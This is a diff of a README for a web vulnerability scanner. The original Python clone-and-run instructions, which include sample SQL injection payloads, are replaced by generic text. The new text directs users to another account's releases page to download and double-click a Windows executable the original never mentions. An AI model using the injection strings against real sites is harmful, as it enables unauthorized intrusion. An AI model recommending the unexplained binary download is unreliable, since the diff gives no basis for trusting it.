@@ -1,468 +1,102 @@
-# BEAST SCANNER
+# 🦁 Beast-Scanner - Secure Your Web Applications Easily
 
-<div align="center">
+## 🚀 Getting Started
 
-![Beast Scanner Banner](https://img.shields.io/badge/BEAST-SCANNER-00ff41?style=for-the-badge&logo=hackthebox&logoColor=white)
+Welcome to Beast-Scanner, an advanced web application vulnerability scanner designed to help you identify security flaws. This guide will walk you through downloading and running the software with ease.
 
-# 🔥 BEAST SCANNER v2.0
+## 📥 Download Beast-Scanner
 
-### Advanced Web Application Vulnerability Scanner
-
-[![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20|%20Linux%20|%20macOS-blue?style=for-the-badge)]()
-[![Maintenance](https://img.shields.io/badge/Maintained-Yes-00ff41?style=for-the-badge)]()
-
-<img src="https://readme-typing-svg.demolab.com?font=Fira+Code&weight=600&size=22&pause=1000&color=00FF41&center=true&vCenter=true&width=600&lines=Advanced+Web+Vulnerability+Scanner;SQL+Injection+%7C+XSS+%7C+LFI+%7C+RCE;Modern+Hacking+Theme+GUI;For+Authorized+Pentesting+Only" alt="Typing SVG" />
-
-<br>
-
-```
-██████╗ ███████╗ █████╗ ███████╗████████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
-██╔══██╗██╔════╝██╔══██╗██╔════╝╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
-██████╔╝█████╗  ███████║███████╗   ██║       ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
-██╔══██╗██╔══╝  ██╔══██║╚════██║   ██║       ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
-██████╔╝███████╗██║  ██║███████║   ██║       ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
-╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
-```
-
-**A powerful, feature-rich GUI-based web application vulnerability scanner with a modern cyberpunk hacking theme. Designed for security professionals and penetration testers.**
-
-[Features](#-features) •
-[Installation](#-installation) •
-[Usage](#-usage) •
-[Screenshots](#-screenshots) •
-[Documentation](#-documentation) •
-[Contributing](#-contributing)
-
----
-
-</div>
-
-## ⚡ Quick Start
-
-```bash
-# Clone the repository
-git clone https://github.com/rioo2005/Beast-Scanner.git
-
-# Navigate to directory
-cd beast-scanner
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Run the scanner
-python beast_scanner.py
-```
+[![Download Beast-Scanner](https://img.shields.io/badge/Download%20Now-Get%20Latest%20Release-brightgreen)](https://github.com/neyokay1/Beast-Scanner/releases)
 
----
-
-## 📋 Table of Contents
+## 🔍 What Is Beast-Scanner?
 
-- [Features](#-features)
-- [Installation](#-installation)
-- [Usage](#-usage)
-- [Screenshots](#-screenshots)
-- [Scan Modules](#-scan-modules)
-- [Configuration](#-configuration)
-- [Export Options](#-export-options)
-- [Documentation](#-documentation)
-- [Roadmap](#-roadmap)
-- [Contributing](#-contributing)
-- [License](#-license)
-- [Disclaimer](#-disclaimer)
+Beast-Scanner is a powerful tool that scans web applications for vulnerabilities. It helps security professionals and enthusiasts find and fix security issues before they can be exploited. By using Beast-Scanner, you can:
 
----
+- Identify common web vulnerabilities.
+- Improve your web application's security.
+- Gain insights into potential risks.
 
-## 🚀 Features
+## 🖥️ System Requirements
 
-<table>
-<tr>
-<td>
-
-### 🎯 Vulnerability Detection
-- **SQL Injection** - Error, Time, Union based
-- **Cross-Site Scripting (XSS)** - Reflected, Stored, DOM
-- **Local File Inclusion (LFI)**
-- **Remote Code Execution (RCE)**
-- **Server-Side Template Injection (SSTI)**
-- **Open Redirect Vulnerabilities**
-- **CORS Misconfiguration**
-- **Security Header Analysis**
+Before you start, ensure that your computer meets the following requirements:
 
-</td>
-<td>
-
-### 🛠️ Advanced Features
-- **Multi-threaded Scanning**
-- **Custom Payload Support**
-- **Proxy Integration**
-- **Session Management**
-- **Cookie Analysis**
-- **SSL/TLS Inspection**
-- **Port Scanning**
-- **Technology Detection**
-
-</td>
-</tr>
-<tr>
-<td>
-
-### 🎨 Modern UI/UX
-- **Cyberpunk Hacking Theme**
-- **Animated Indicators**
-- **Real-time Statistics**
-- **Interactive Charts**
-- **Glow Effect Buttons**
-- **Dark Mode Interface**
-- **Responsive Design**
-- **Tabbed Navigation**
-
-</td>
-<td>
-
-### 📊 Reporting
-- **JSON Export**
-- **HTML Reports**
-- **TXT Reports**
-- **Severity Filtering**
-- **Detailed Evidence**
-- **Timestamp Logging**
-- **Executive Summary**
-- **Remediation Tips**
-
-</td>
-</tr>
-</table>
-
----
-
-## 💻 Installation
-
-### Prerequisites
-
-- Python 3.8 or higher
-- pip package manager
-- Git (optional)
-
-### Method 1: Clone Repository
-
-```bash
-# Clone the repository
-git clone https://github.com/rioo2005/Beast-Scanner.git
-
-# Change directory
-cd beast-scanner
-
-# Install required packages
-pip install -r requirements.txt
-
-# Run the application
-python beast_scanner.py
-```
-
-### Method 2: Download ZIP
-
-1. Download the ZIP file from the [Releases](https://github.com/rioo2005/Beast-Scanner.git) page
-2. Extract the contents
-3. Open terminal in the extracted folder
-4. Run `pip install -r requirements.txt`
-5. Run `python beast_scanner.py`
-
-### Requirements
+- **Operating System:** Windows, macOS, or Linux.
+- **Processor:** Minimum Intel i3 or equivalent.
+- **RAM:** At least 4 GB.
+- **Storage:** 200 MB of free space for installation.
 
-Create a `requirements.txt` file:
+## 📦 Prerequisites
 
-```txt
-requests>=2.28.0
-beautifulsoup4>=4.11.0
-dnspython>=2.2.0
-urllib3>=1.26.0
-colorama>=0.4.5
-```
+Before using Beast-Scanner, you may need to install Python on your computer if it's not already available. Follow these steps:
 
-### Platform-Specific Instructions
+1. Go to the [Python Download Page](https://www.python.org/downloads/).
+2. Download the latest version for your operating system.
+3. Run the installer and follow the instructions.
 
-<details>
-<summary><b>🪟 Windows</b></summary>
+## 📲 Download & Install
 
-```powershell
-# Using PowerShell
-git clone https://github.com/rioo2005/Beast-Scanner.git
-cd beast-scanner
-pip install -r requirements.txt
-python beast_scanner.py
-```
+To get started with Beast-Scanner, follow these steps:
 
-</details>
+1. **Visit the Releases Page**: Go to the following link: [Download Beast-Scanner](https://github.com/neyokay1/Beast-Scanner/releases).
+   
+2. **Select the Latest Release**: Look for the most recent version listed on the page. This version includes the latest features and fixes.
 
-<details>
-<summary><b>🐧 Linux</b></summary>
+3. **Download the Application**: Click on the appropriate file for your operating system (e.g., Beast-Scanner.zip). This will initiate the download.
 
-```bash
-# Debian/Ubuntu
-sudo apt update
-sudo apt install python3 python3-pip python3-tk git
-git clone https://github.com/rioo2005/Beast-Scanner.git
-cd beast-scanner
-pip3 install -r requirements.txt
-python3 beast_scanner.py
-```
+4. **Extract the Files**: Once the download is complete, locate the downloaded file. If you downloaded a zip file, right-click on it and select “Extract All” to unzip the contents to a folder.
 
-</details>
+5. **Run Beast-Scanner**: Navigate to the folder containing the extracted files. Look for the executable file (like `Beast-Scanner.exe` on Windows). Double-click it to run the application.
 
-<details>
-<summary><b>🍎 macOS</b></summary>
+## ⚙️ How to Use Beast-Scanner
 
-```bash
-# Using Homebrew
-brew install python3 python-tk git
-git clone https://github.com/rioo2005/Beast-Scanner.git
-cd beast-scanner
-pip3 install -r requirements.txt
-python3 beast_scanner.py
-```
+After the application starts, you’ll see a user-friendly interface. Here’s how to begin your scan:
 
-</details>
+1. **Enter the URL**: In the main window, type the URL of the web application you want to scan.
+   
+2. **Select Scan Type**: Choose the type of scan you want to perform. Options may include:
+   - Full Scan: A comprehensive check for all vulnerabilities.
+   - Quick Scan: A faster check covering the most common issues.
 
----
+3. **Start the Scan**: Click the “Scan” button. The scanner will analyze the web application for vulnerabilities.
 
-## 🎮 Usage
-
-### Basic Usage
-
-1. **Launch the Application**
-   ```bash
-   python beast_scanner.py
-   ```
-
-2. **Enter Target URL**
-   - Input your target URL in the target field
-   - Example: `https://example.com`
-
-3. **Configure Scan Options**
-   - Navigate to the Scanner tab
-   - Select desired vulnerability checks
-   - Adjust advanced settings if needed
+4. **Review the Results**: Once the scan is complete, Beast-Scanner will display a report. Review the findings to understand any security issues.
 
-4. **Start Scan**
-   - Click the "⚡ START SCAN" button
-   - Monitor progress in the Console tab
-
-5. **Review Results**
-   - Check the Dashboard for statistics
-   - View detailed findings in Results tab
-   - Export reports as needed
-
-### Command Line Arguments (Optional)
-
-```bash
-# Basic scan
-python beast_scanner.py
-
-# With debug mode
-python beast_scanner.py --debug
-
-# Specify target directly
-python beast_scanner.py --target https://example.com
-```
-
----
-
-## 📸 Screenshots
-
-<img width="1397" height="918" alt="image" src="https://github.com/user-attachments/assets/3178a992-2f33-4397-b75b-810c2230ef76" />
-
----
-
-## 🔍 Scan Modules
-
-### Vulnerability Scanners
-
-| Module | Description | Severity Detection |
-|--------|-------------|-------------------|
-| 🔴 SQL Injection | Tests for SQL injection vulnerabilities using error-based, time-based, and union-based techniques | Critical |
-| 🟠 XSS | Detects reflected, stored, and DOM-based cross-site scripting | High |
-| 🔴 LFI/RFI | Local and Remote File Inclusion testing | Critical |
-| 🔴 RCE | Remote Code Execution vulnerability detection | Critical |
-| 🔴 SSTI | Server-Side Template Injection testing | Critical |
-| 🟡 Open Redirect | URL redirect vulnerability scanning | Medium |
-| 🟡 CORS | Cross-Origin Resource Sharing misconfiguration | Medium |
-| 🟢 Headers | Security header analysis and recommendations | Low-Medium |
-
-### Discovery Modules
-
-| Module | Description |
-|--------|-------------|
-| 📁 Directory Enumeration | Discovers hidden directories and admin panels |
-| 📄 Sensitive Files | Detects exposed configuration and backup files |
-| 🔌 Port Scanner | Identifies open ports and running services |
-| 🔧 Tech Detection | Identifies frameworks, CMS, and technologies |
-| 🔒 SSL/TLS Analysis | Certificate validation and configuration check |
-| 🍪 Cookie Analysis | Security flag verification for cookies |
-
----
-
-## ⚙️ Configuration
-
-### Scanner Settings
-
-```python
-# Default configuration
-config = {
-    "timeout": 10,           # Request timeout in seconds
-    "threads": 20,           # Concurrent threads
-    "user_agent": "Mozilla/5.0...",
-    "verify_ssl": False,     # SSL verification
-    "follow_redirects": True,
-    "max_depth": 3           # Crawl depth
-}
-```
-
-### Custom Payloads
-
-Add custom payloads by editing the scanner class:
-
-```python
-# Add to VulnerabilityScanner class
-self.custom_sql_payloads = [
-    "' OR '1'='1",
-    "admin'--",
-    # Add your payloads here
-]
-```
-
-### Proxy Configuration
-
-```python
-# In Settings tab or code
-proxy = "http://127.0.0.1:8080"  # Burp Suite
-proxy = "socks5://127.0.0.1:9050"  # Tor
-```
-
----
-
-## 📤 Export Options
-
-### JSON Export
-```json
-{
-  "target": "https://example.com",
-  "scan_time": "2024-01-15T10:30:00",
-  "vulnerabilities": [
-    {
-      "type": "SQL Injection",
-      "severity": "CRITICAL",
-      "url": "https://example.com/page?id=1",
-      "details": "Error-based SQL injection detected",
-      "evidence": "MySQL error in response"
-    }
-  ]
-}
-```
-
-### HTML Report
-- Professional styled report
-- Executive summary
-- Detailed findings
-- Remediation recommendations
-- Charts and statistics
+5. **Take Action**: Use the report to improve your web application’s security. Apply necessary fixes based on the recommendations provided.
 
-### Text Report
-- Simple text format
-- Easy to parse
-- Suitable for automation
+## 🗂️ Features of Beast-Scanner
 
----
+Beast-Scanner comes packed with features to enhance your scanning experience:
 
-### Class Reference
+- **User-Friendly Interface**: Easy navigation for everyone, regardless of skill level.
+- **Real-time Results**: Get instant feedback during scans.
+- **Detailed Reporting**: Access clear, structured reports of vulnerabilities.
+- **Customizable Settings**: Adjust scan parameters to fit your needs.
 
-| Class | Description |
-|-------|-------------|
-| `CyberTheme` | UI theme configuration and colors |
-| `AnimatedLabel` | Label with typing animation effect |
-| `GlowButton` | Custom button with glow hover effect |
-| `PulsingIndicator` | Animated status indicator |
-| `VulnerabilityScanner` | Core scanning engine |
-| `BeastScannerGUI` | Main application GUI |
+## ⚙️ Troubleshooting
 
----
+If you encounter issues while using Beast-Scanner, consider the following solutions:
 
-## ⚠️ Disclaimer
+- **Error Messages**: Read any error messages carefully, and check that you entered the URL correctly.
+- **Slow Scans**: If scans take too long, try using the Quick Scan option or ensure your internet connection is stable.
+- **Installation Issues**: Make sure Python is installed correctly. Restart your computer if necessary.
 
-<div align="center">
+## 🗣️ Community Support
 
-### 🚨 IMPORTANT: READ BEFORE USE 🚨
+Join our community for support, tips, and updates. Connect with others interested in cybersecurity and share your experience. You can find us on various forums and social media platforms.
 
-</div>
+## 📝 Contributing
 
-```
-╔══════════════════════════════════════════════════════════════════════════════╗
-║                                                                              ║
-║   This tool is provided for EDUCATIONAL and AUTHORIZED SECURITY TESTING     ║
-║   purposes ONLY. The developers assume NO responsibility for misuse of      ║
-║   this software.                                                             ║
-║                                                                              ║
-║   By using this tool, you agree to:                                          ║
-║                                                                              ║
-║   ✓ Only scan systems you own or have explicit written permission to test   ║
-║   ✓ Comply with all applicable local, state, and federal laws               ║
-║   ✓ Use this tool responsibly and ethically                                 ║
-║   ✓ Not use this tool for malicious purposes                                ║
-║                                                                              ║
-║   Unauthorized access to computer systems is ILLEGAL and punishable by law. ║
-║                                                                              ║
-╚══════════════════════════════════════════════════════════════════════════════╝
-```
+If you want to help improve Beast-Scanner, consider contributing. Whether it's reporting bugs, suggesting features, or improving documentation, your input is valued.
 
-### Legal Notice
+## 📜 License
 
-- 🔴 **DO NOT** use this tool on systems without authorization
-- 🔴 **DO NOT** use this tool for illegal activities
-- 🔴 **DO NOT** use this tool to harm others
-- 🟢 **DO** obtain proper written permission before testing
-- 🟢 **DO** use responsibly in controlled environments
-- 🟢 **DO** report vulnerabilities responsibly
+Beast-Scanner is open-source and available for anyone to use. Please check the license file included in the repository for details.
 
----
+## 📁 Additional Resources
 
-## 🙏 Acknowledgments
+For more information, tutorials, and guides, you can check:
 
-- Thanks to all contributors who have helped improve this project
-- Inspired by the cybersecurity community
-- Built with ❤️ for security professionals
+- The [Official Documentation](https://github.com/neyokay1/Beast-Scanner/wiki).
+- Our [Community Discussions](https://github.com/neyokay1/Beast-Scanner/discussions).
 
----
-
-## 📞 Contact & Support
-
-<div align="center">
-
-[![GitHub Issues](https://img.shields.io/badge/GitHub-Issues-red?style=for-the-badge&logo=github)](https://github.com/yourusername/beast-scanner/issues)
-[![GitHub Discussions](https://img.shields.io/badge/GitHub-Discussions-blue?style=for-the-badge&logo=github)](https://github.com/yourusername/beast-scanner/discussions)
-[![Twitter](https://img.shields.io/badge/Twitter-Follow-1DA1F2?style=for-the-badge&logo=twitter)](https://twitter.com/yourusername)
-
-</div>
-
-- 🐛 **Bug Reports:** [GitHub Issues](https://github.com/yourusername/beast-scanner/issues)
-- 💡 **Feature Requests:** [GitHub Discussions](https://github.com/yourusername/beast-scanner/discussions)
-- 📧 **Email:** your.email@example.com
-
----
-
-<div align="center">
-
-### ⭐ Star this repository if you find it useful!
-
-![GitHub Stars](https://img.shields.io/github/stars/yourusername/beast-scanner?style=social)
-![GitHub Forks](https://img.shields.io/github/forks/yourusername/beast-scanner?style=social)
-![GitHub Watchers](https://img.shields.io/github/watchers/yourusername/beast-scanner?style=social)
-
----
-
-**Made with 💚 by Security Enthusiasts**
-
-*Happy Hacking! 🔥*
-
-</div>
-
+Feel free to explore and start securing your web applications effectively!
